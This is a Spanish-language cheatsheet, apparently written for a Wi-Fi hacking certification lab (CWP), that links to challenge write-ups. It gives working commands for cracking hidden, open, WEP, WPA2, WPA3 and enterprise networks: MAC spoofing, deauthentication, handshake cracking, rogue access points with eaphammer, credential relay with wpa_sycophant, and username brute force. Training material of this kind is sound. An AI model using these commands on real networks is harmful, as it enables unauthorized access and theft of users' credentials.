---
description: With love, eldeim
---

# 👑 CWP Cheatsheet

## Redes Ocultas

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

1. Escanear redes ocultas para encontrar su nombre. Esto lo hacemos con `mk4` -->

```
## Conguracion del canal 11
iwconfig wlan0 channel 11
## Ataque de fuerza bruta
mdk4 wlan0 p -t F0:9F:C2:6A:88:26 -f /root/rockyou-top100000.txt
```

> Suponiendo que es un wifi, filtro dentro del rocku por algo que empiece por "wifi" y repito el ataque. Descubriendo asi la el SSID de la wifi -->

```
cat /root/rockyou-top100000.txt | awk '{print "wifi-" $1}' > /root/wifi-rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.0-recon-wi-fi-ofensivo/challenges-recon" %}

***

## Redes OPN

1. Es posible que la red OPN (de wifi abierta) tenga el nombre oculto, asi que tras encontrar el nombre, debemos conectarnos
2. Probar contraseñas por defecto en el router/puerta de enlace
3. Evadir portal cautivo cambiando nuestra MAC por la de otro cliente con macchanger (ejemplo en [Capitulo 5.1, reto 6](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.1-ataques-wi-fi-opn-redes-publicas-abiertas/challenges-opn#challenge-6))

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
## Apagamos la interfaz wlan2 (interfaz en modo normal que no utiliza modo monitor)
ip link set wlan2 down
## Cambiamos la direccion MAC por uno de los clientes
macchanger -m 80:18:44:BF:72:47 wlan2
## Levantamos la interfaz
ip link set wlan2 up
## Paramos NetworkManager por posibles errores
systemctl stop network-manager.service
## Comprobamos MACs
macchanger wlan2
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

4. Interceptar trafico en escucha con `airodump-ng` y capturar peticiones como; credenciales de acceso al router

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.1-ataques-wi-fi-opn-redes-publicas-abiertas/challenges-opn" %}

***

## Redes WEP

1. (Modo facil) - Utilizamos la herramienta automatizada `Besside-ng`, especificando el BSSID del AP para que haga el ataque de fuerza bruta al "PIN". Por ultimo nos conectamos

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.3-ataques-wi-fi-wep-wired-equivalent-privacy/challenges-wep#besside-ng" %}

***

## Redes PSK - WPA/WPA2

1. Escanear trafico de ese AP/BSSID para captura el handshake y crackear la contraseña
   1. Si es necesario, hacer ataques de des autentificación
2. Si tenemos la contraseña de la wifi y el trafico capturado/handshake, podemos desencriptar el trafico con `airdecap-ng` para ver posible credenciales enviadas y/o cookies de sesion ([Capitulo 5.4, challenge 9](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.4-ataques-wi-fi-psk-pre-shared-key/challenges-psk#challenge-09))
3. Una vez dentro de la red, podemos comprobar si existe aislamiento entre clientes, lanzado un `arp-scan` y `nmap` para ver sus puertos y tambien si tienen webs corriendo
4. Comprobar usuarios conectados a APs/BSSIDs imbisibles, pero con probes. Si existen, realizar un ataque `NO AP` con `hostapd-mana` para obtener su hash y crakear la password ([Capitulo 5.4, challenge 12](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.4-ataques-wi-fi-psk-pre-shared-key/challenges-psk#challenge-12))

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.4-ataques-wi-fi-psk-pre-shared-key/challenges-psk#challenge-12" %}

***

## Redes SAE - WPA3

1. Realizar un ataque de fuerza online para internar conectarnos ([Capitulo 5.5, challege 13](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.5-ataques-wi-fi-sae-simultaneous-authentication-of-equals/challenges-sae#challenge-13))

```
iwlist wlan0 frequency | grep 'Channel 11 :'
```

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252FXfUSiwxG8NfnmuZIXAGM%252Fimage.png%3Falt%3Dmedia%26token%3Db14e9c87-aebf-41da-b0fe-a6d2762bb17a&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=2c8483f8&#x26;sv=2" alt=""><figcaption></figcaption></figure>

> Channel 11 : 2.462 GHz

```
./wacker.py --wordlist ~/rockyou-top100000.txt --ssid 'wifi-management' --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462
```

> `--interface` : Hay que poner una interfaz de red que no este en modo monitor

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252FBsYjyjwer7nzVB09s7mT%252Fimage.png%3Falt%3Dmedia%26token%3D303e5b54-bc1e-46ec-a93f-e7060ca54a31&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=63f0a53b&#x26;sv=2" alt=""><figcaption></figcaption></figure>

2. Si una red WPA3 tiene cliente, hace un ataque de Downgrade ([Capitulo 5.5, challenge 14](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.5-ataques-wi-fi-sae-simultaneous-authentication-of-equals/challenges-sae#challenge-14))

<figure><img src="../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.5-ataques-wi-fi-sae-simultaneous-authentication-of-equals/challenges-sae" %}

***

## Redes MGT

### Recon MGT

1. Obtener nombre de dominio de un cliente conectado a una red MGT. Podemos capturar su trafico con `airodump-ng` hasta ver a un cliente autentificarse con el AP/Capturar el handshake <mark style="background-color:yellow;">(este handshake no nos sirve para ningún ataque (por el tipo de red MGT que es))</mark> Y ese trafico analizarlo con wireshark o wifi\_db para obtener el nombre del dominio de ese cliente

<figure><img src="../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

2. Obtener dirección de correo del certificado del servidor. En las redes MGT utilizan un certificado TLS para enviar las credenciales cifradas, asi que podemos utilizar la captura de `airodump-ng` anterior y usar `pcapFilter`

```
bash /root/tools/pcapFilter.sh -f /home/user/wifi/MGT/regi-01.cap -C | more
```

> `-C` : para obtener la información de los certificados
>
> `| more` : para mostrar por paginas

3. Podemos comprobar que método EAP sorporta el AP con EAP\_buster ([Capitulo 5.6, challenge 17](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.6-ataques-wi-fi-recon-mgt/challenges-recon-mgt#challenge-17))

<figure><img src="../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.6-ataques-wi-fi-recon-mgt/challenges-recon-mgt" %}

***

### Attack MGT

1. Al escanear el trafico con `airodump-ng` vemos usuarios, podemos crear un AP falso, para esto hay que crear un certificado TLS para el AP usando `eaphammer` ([Capitulo 5.7, challenge 18](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.7-ataques-wi-fi-mgt/challenges-mgt#challenge-18))&#x20;

Sacamos info del certf de sesion de esta wifi, utilizamos `pcapFilter` -->

```
bash /root/tools/pcapFilter.sh -C -f /home/user/wifi/MGT/wifi-global-01.cap
```

<figure><img src="../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

Ahora para general el certificado usamos `eaphammer` -->

<figure><img src="../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Ahora que tenemos el certificado, levantamos el punto de acceso con `eaphammer`

```
python3 /root/tools/eaphammer/eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp
```

<figure><img src="../../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

> Ataque de des autentificación <mark style="background-color:yellow;">(es podible que el cliente quiera conectarse a dos redes diferentes, abra que tirarle de ambas)</mark>

<figure><img src="../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

2. Si tenemos un usuario y dominio, _ej:(CONTOSO\test)_, podemos hacer un ataque de fuerza bruta ([Capitulo 5.7, challenge 19](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.7-ataques-wi-fi-mgt/challenges-mgt#challenge-19))

<figure><img src="../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

3. Si tenemos una contraseña y dominio, podemos hacer un ataque de fuerza bruta para indentificar el usuario con `air-hammer` ([Capitulo 5.7, challenge 20](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.7-ataques-wi-fi-mgt/challenges-mgt#challenge-20))

```
cat /root/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > /home/user/wifi/MGT/top-users-CONTOSO.txt
```

<figure><img src="../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

```
/root/tools/air-hammer/air-hammer.py -i wlan1 -e wifi-corp -P 12345678 -u /home/user/wifi/MGT/top-users-CONTOSO.txt 
```

<figure><img src="../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

4. Podemos crear un AP falso con su mismo nombre y MAC, y asi des autentificar a los usaurio conectados al AP real y si conecten al nuestro, dando credenciales ([Capitulo 5.7, challenge 21](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.7-ataques-wi-fi-mgt/challenges-mgt#challenge-21))&#x20;

<figure><img src="../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

5. Si al crear un AP falso y hacer el ataque, el cliente verifica la CA podemos levantar un AP falso manteniendo el `wpa_sycopham` a la red wifi-regional. Asi que un cliente se nos conecta al AP falso y reenviamos sus credenciales ([Capitulo 5.7, challenge 22](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.7-ataques-wi-fi-mgt/challenges-mgt#challenge-22))

<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

Levanatamos el AP de wifi-regional-tables

```
/root/tools/berate_ap/berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
```

Manemos el wpa\_sycophant a la wifi-regional original -->

```
./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
```

Y por ultimo el ataque des autentificaon se hace contra un cliente de wiif-regiona-tables (como en el challenges anterior)(reuitlizo ese comando) -->

```
aireplay-ng -0 0 wlan0 -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55
```

6. Si el AP MGT solo soporta autenticación con certificados, significa que no podemos atacar directamente esa comunicación, pero si capturar el trafico con `airodump-ng` y ver mas información usando `wifi_db` podemos ver sus probes. Si tiene probes de wifi abierta OPN, podemos hacer la desconexión del AP real con el AP legitimo, de este modo el cliente se nos conecta a nuestro AP falso y desde un portal cautivo, le pedimos user and password y se las robamos ([Capitulo 5.7, challenge 23](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.7-ataques-wi-fi-mgt/challenges-mgt#challenge-23))

<figure><img src="../../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

7. Si tenemos la clave privada de la CA y un certificado del servidor, podemos levantar un AP falso con ese certificado y asi conseguir que esos usuario que si verifican el CA, puedan conectarse a nuestro AP falso y nos den sus credenciales ([Capitulo 5.7, challenge 25](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.7-ataques-wi-fi-mgt/challenges-mgt#challenge-25))

<figure><img src="../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

8. Si tenemos el `.key` del cliente y la CA podemos generar un certificado de cliente con `openssl` y asi con este conectarnos directamente al AP ([Capitulo 5.7, challenge 26](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.7-ataques-wi-fi-mgt/challenges-mgt#challenge-26))

<figure><img src="../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://eldeim.gitbook.io/brain_fuck/checklists/certifications/cwp-certified-wifichallenge-professional/capitulo-5.7-ataques-wi-fi-mgt/challenges-mgt" %}
